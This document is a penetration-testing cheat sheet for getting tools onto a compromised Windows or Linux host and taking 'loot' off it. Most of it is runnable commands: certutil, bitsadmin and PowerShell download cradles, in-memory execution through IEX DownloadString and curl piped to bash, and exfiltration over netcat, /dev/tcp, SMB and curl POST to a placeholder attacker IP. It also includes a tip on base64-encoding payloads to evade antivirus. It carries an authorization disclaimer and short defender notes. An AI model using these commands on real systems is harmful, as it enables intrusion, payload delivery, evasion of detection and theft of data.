File Transfers - Cheat Sheet

Get tools onto the target and loot off it. Covers both directions
(attacker → target, target → attacker) across Windows and Linux.
Replace <placeholders> with your own values.

>>> Only use on systems you own or are authorized to test. <<<


Attacker: Start a Server

    # Python HTTP (serves current directory)
    python3 -m http.server 80
    python3 -m http.server 443

    # Python upload server (accepts POST)
    python3 -c "
    import http.server, cgi
    class H(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
            f = form['file']
            open(f.filename,'wb').write(f.file.read())
            self.send_response(200); self.end_headers()
    http.server.HTTPServer(('0.0.0.0',80),H).serve_forever()
    "

    # SMB share (impacket)
    impacket-smbserver share . -smb2support
    impacket-smbserver share . -smb2support -username user -password pass

    # Netcat listener (receive file)
    nc -lvnp 4444 > received_file


Download to Windows Target

    # certutil (built-in, most reliable)
    certutil -urlcache -split -f http://<ip>/payload.exe C:\Windows\Temp\payload.exe

    # PowerShell (multiple methods)
    Invoke-WebRequest -Uri http://<ip>/payload.exe -OutFile C:\Windows\Temp\payload.exe
    (New-Object Net.WebClient).DownloadFile('http://<ip>/payload.exe','C:\Windows\Temp\payload.exe')
    IEX(New-Object Net.WebClient).DownloadString('http://<ip>/script.ps1')

    # PowerShell with proxy/TLS
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri https://<ip>/payload.exe -OutFile payload.exe

    # Bitsadmin (built-in)
    bitsadmin /transfer job /download /priority high http://<ip>/payload.exe C:\Windows\Temp\payload.exe

    # SMB copy (from impacket-smbserver)
    copy \\<ip>\share\payload.exe C:\Windows\Temp\payload.exe
    # with creds:
    net use \\<ip>\share /user:user pass
    copy \\<ip>\share\payload.exe C:\Windows\Temp\payload.exe

    # curl (available on newer Windows 10+)
    curl http://<ip>/payload.exe -o C:\Windows\Temp\payload.exe


Download to Linux Target

    # wget
    wget http://<ip>/payload -O /tmp/payload
    chmod +x /tmp/payload

    # curl
    curl http://<ip>/payload -o /tmp/payload
    curl http://<ip>/script.sh | bash

    # Netcat
    nc <ip> 4444 > /tmp/payload

    # /dev/tcp (bash built-in, no tools needed)
    cat < /dev/tcp/<ip>/80 > /tmp/payload

    # scp (if SSH access)
    scp <user>@<ip>:/path/to/payload /tmp/payload

    # Python
    python3 -c "import urllib.request; urllib.request.urlretrieve('http://<ip>/payload','/tmp/payload')"


Upload / Exfil from Windows Target

    # PowerShell POST upload
    Invoke-WebRequest -Uri http://<ip>/upload -Method POST -InFile C:\Users\<user>\loot.zip

    # SMB (copy to your share)
    copy C:\Users\<user>\loot.zip \\<ip>\share\loot.zip

    # certutil base64 encode → copy-paste
    certutil -encode loot.zip loot.b64
    type loot.b64
    # on attacker: base64 -d loot.b64 > loot.zip

    # Netcat
    nc <ip> 4444 < C:\Users\<user>\loot.zip

    # Invoke-WebRequest with multipart form
    $bytes = [IO.File]::ReadAllBytes("C:\loot.zip")
    Invoke-WebRequest -Uri http://<ip>/upload -Method POST -Body $bytes -ContentType "application/octet-stream"


Upload / Exfil from Linux Target

    # curl POST
    curl -X POST http://<ip>/upload -F "file=@/tmp/loot.zip"

    # Netcat
    nc <ip> 4444 < /tmp/loot.zip

    # scp
    scp /tmp/loot.zip <user>@<ip>:/tmp/

    # base64 encode → copy-paste (small files)
    base64 /tmp/loot.zip
    # on attacker: echo "<base64>" | base64 -d > loot.zip

    # /dev/tcp
    cat /tmp/loot.zip > /dev/tcp/<ip>/4444


Living off the Land (no extra tools)

    Windows: certutil, bitsadmin, PowerShell, SMB, curl (10+)
    Linux: /dev/tcp, python (usually installed), wget/curl

    # encode to bypass AV detection of transfer
    certutil -encode payload.exe payload.b64
    certutil -decode payload.b64 payload.exe


Quick Reference (what to try first)

    Windows download:  certutil → PowerShell IWR → SMB copy
    Linux download:    wget → curl → /dev/tcp
    Upload/exfil:      SMB share → curl POST → nc
    In-memory only:    IEX(Net.WebClient).DownloadString (PS)
                       curl ... | bash (Linux)


Defender Notes (for the report)
  - Monitor certutil, bitsadmin, PowerShell download cradle usage
  - Block outbound SMB (445) at the firewall
  - Application whitelisting prevents execution of downloaded binaries
  - Network IDS/IPS signatures for common transfer patterns
  - DNS exfiltration is an alternative if HTTP/SMB are blocked


Key idea: you always need to move files — tools onto the target, loot off it.
certutil is the most reliable Windows built-in. wget/curl cover Linux. SMB
shares (impacket-smbserver) are the easiest bidirectional method. For stealth,
keep everything in memory (IEX/DownloadString or curl|bash). Always have 2-3
methods ready — if one is blocked, switch to another.
